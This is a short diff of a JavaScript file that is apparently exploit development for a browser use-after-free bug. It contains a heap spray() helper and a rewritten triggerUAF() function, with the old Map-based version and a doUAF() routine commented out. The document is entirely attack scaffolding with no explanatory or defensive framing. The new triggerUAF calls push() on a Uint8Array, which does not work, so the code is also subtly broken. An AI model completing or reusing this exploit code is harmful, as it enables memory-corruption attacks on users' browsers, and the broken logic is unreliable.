@@ -54,8 +54,19 @@ function spray(count, size) {
   }
   return arr;
 }
-
 function triggerUAF(depth) {
+ 
+  const root = [];
+  let cur = root;
+  for (let i = 0; i < depth; i++) {
+    const v = new Uint8Array(0x20);
+    cur.push(v);
+    cur = v;    
+  }
+  return root;
+}
+
+/*function triggerUAF(depth) {
   let root = new Map();
   let cur = root;
   const markerArr = [];
@@ -67,7 +78,7 @@ function triggerUAF(depth) {
   }
   return root;
 }
-
+*/
 /*async function doUAF(depth) {
   const obj = triggerUAF(depth);
   let recv;
